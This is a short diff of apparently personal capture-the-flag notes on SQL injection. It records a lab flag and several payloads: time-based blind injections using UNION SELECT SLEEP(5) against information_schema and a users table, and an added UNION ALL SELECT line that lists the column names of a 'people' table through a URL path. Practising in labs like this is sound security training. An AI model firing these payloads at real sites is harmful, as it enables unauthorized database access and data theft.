@@ -31,3 +31,5 @@ referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE 
   admin123' UNION SELECT sleep(5),2 from users where username like 'a%';
 
   blind sqi time based -- THM{SQL_INJECTION_MASTER}
+
+/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
